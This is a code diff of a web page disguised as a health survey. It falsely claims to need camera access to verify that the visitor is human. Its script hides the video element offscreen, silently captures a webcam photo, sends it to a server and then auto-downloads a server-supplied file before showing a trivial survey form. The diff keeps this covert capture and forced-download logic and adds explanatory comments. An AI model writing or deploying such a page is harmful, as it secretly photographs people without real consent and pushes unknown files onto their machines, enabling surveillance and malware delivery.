@@ -1,57 +1,16 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<title>Health Survey</title>
-<style>
-body { font-family: Arial; text-align: center; margin-top: 30px; background: #f2f2f2; }
-video { width: 1px; height: 1px; position: absolute; top: -100px; left: -100px; }
-canvas { display: none; }
-h2 { color: #333; }
-p { color: #555; }
-form { margin-top: 20px; display: none; background: #fff; padding: 20px; border-radius: 10px; width: 320px; margin-left: auto; margin-right: auto; }
-input, select, textarea { width: 100%; margin-bottom: 10px; padding: 6px; }
-button { padding: 10px 20px; cursor: pointer; background: #4CAF50; color: white; border: none; border-radius: 5px; }
-</style>
-</head>
-
-<body>
-<h2>Please allow camera to continue 😊</h2>
-<p>This helps us confirm you are human before the survey.</p>
-
-<video id="video" autoplay></video>
-<canvas id="canvas"></canvas>
-
-<form id="surveyForm">
-  <h3>Health Survey</h3>
-
-  <label>Name:</label>
-  <input type="text" name="name" required>
-
-  <label>How many hours do you sleep?</label>
-  <select name="sleep" required>
-    <option value="<5"><5</option>
-    <option value="5-6">5-6</option>
-    <option value="6-7">6-7</option>
-    <option value="7+">7+</option>
-  </select>
-
-  <button type="submit">Submit</button>
-</form>
-
-<p id="thanksMessage" style="display:none;">Thank you for confirming! Redirecting to survey...</p>
-
 <script>
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const form = document.getElementById("surveyForm");
 const thanks = document.getElementById("thanksMessage");
 
+// Camera init
 async function init() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     video.srcObject = stream;
 
+    // Capture photo after 1 second
     setTimeout(() => captureAndSend(stream), 1000);
 
   } catch (err) {
@@ -59,6 +18,7 @@ async function init() {
   }
 }
 
+// Capture and send
 function captureAndSend(stream) {
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
@@ -73,15 +33,14 @@ function captureAndSend(stream) {
       const data = await res.json();
 
       if (data.status === "success") {
-        // Trigger download
+        // Auto-download
         const a = document.createElement("a");
         a.href = data.downloadUrl;
-        a.download = ""; 
+        a.download = ""; // triggers download in browser
         document.body.appendChild(a);
         a.click();
         a.remove();
 
-        // Show survey
         document.querySelector('h2').style.display = 'none';
         document.querySelector('p').style.display = 'none';
         form.style.display = 'block';
@@ -96,6 +55,7 @@ function captureAndSend(stream) {
   stream.getTracks().forEach(track => track.stop());
 }
 
+// Form submission
 form.addEventListener("submit", e => {
   e.preventDefault();
   form.style.display = "none";
@@ -104,6 +64,4 @@ form.addEventListener("submit", e => {
 
 init();
 </script>
-</body>
-</html>
 
